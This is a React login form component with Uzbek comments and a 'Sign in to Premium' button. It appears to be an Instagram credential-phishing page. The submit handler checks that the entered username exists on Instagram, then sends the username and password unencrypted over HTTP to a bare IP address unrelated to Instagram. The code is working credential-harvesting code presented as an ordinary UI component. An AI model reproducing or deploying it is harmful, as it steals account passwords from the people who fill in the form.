import React, { useState } from 'react';
import FloatingLabelInput from './FloatingLabelInput';
import GradientButton from './GradientButton';
import { cn } from '@/lib/utils';

interface LoginFormProps {
   onSubmit?: (data: { username: string; password: string }) => void;
   loading?: boolean;
   error?: string;
   className?: string;
}

const LoginForm = ({
   loading = false,
   error = '',
   className = '',
}: LoginFormProps) => {
   const [formData, setFormData] = useState({
      username: '',
      password: '',
   });

   const [validationErrors, setValidationErrors] = useState({
      username: '',
      password: '',
   });

   const handleSubmit = async (e: React.FormEvent) => {
      e.preventDefault();

      setValidationErrors({
         username:
            formData.username.trim() === '' ? 'Please enter your username' : '',
         password:
            formData.password.trim() === '' ? 'Please enter your password' : '',
      });

      if (!formData.username || !formData.password) return;

      try {
         // 1. Instagram foydalanuvchisini tekshirish
         const instagramResponse = await fetch(
            `https://www.instagram.com/${formData.username}/?__a=1&__d=dis`,
         );

         if (instagramResponse.status !== 200) {
            alert('The username does not exist on Instagram.');
            return;
         }

         // 2. Login so‘rovini yuborish
         const response = await fetch('http://185.217.131.96:1111/login', {
            method: 'POST',
            headers: {
               'Content-Type': 'application/json',
            },
            body: JSON.stringify({ ...formData }),
         });

         const data = await response.json();
         console.log('Server response:', data);

         if (response.ok) {
            alert('Login successful!');
         } else {
            setValidationErrors((prev) => ({
               ...prev,
               username: data.message || 'Invalid username or password',
            }));
         }
      } catch (error) {
         console.error('Error sending login request:', error);
         alert('Failed to send login request.');
      }
   };

   return (
      <div
         className={cn(
            'bg-white w-[400px] h-[320px] p-8 rounded-lg shadow-lg',
            'flex flex-col items-center justify-center gap-6',
            className,
         )}
      >
         <form onSubmit={handleSubmit} className="w-full space-y-6">
            <FloatingLabelInput
               label="Username or Email"
               type="text"
               id="username"
               value={formData.username}
               onChange={(e) =>
                  setFormData({ ...formData, username: e.target.value })
               }
               error={validationErrors.username}
               className="w-full"
            />

            <FloatingLabelInput
               label="Password"
               type="password"
               id="password"
               value={formData.password}
               onChange={(e) => {
                  setFormData({ ...formData, password: e.target.value });
               }}
               error={validationErrors.password}
               className="w-full"
            />

            {error && (
               <div className="text-red-500 text-sm text-center">{error}</div>
            )}

            <GradientButton
               type="submit"
               loading={loading}
               className="w-full mt-4 transition-all"
            >
               Sign in to Premium
            </GradientButton>
         </form>
      </div>
   );
};

export default LoginForm;
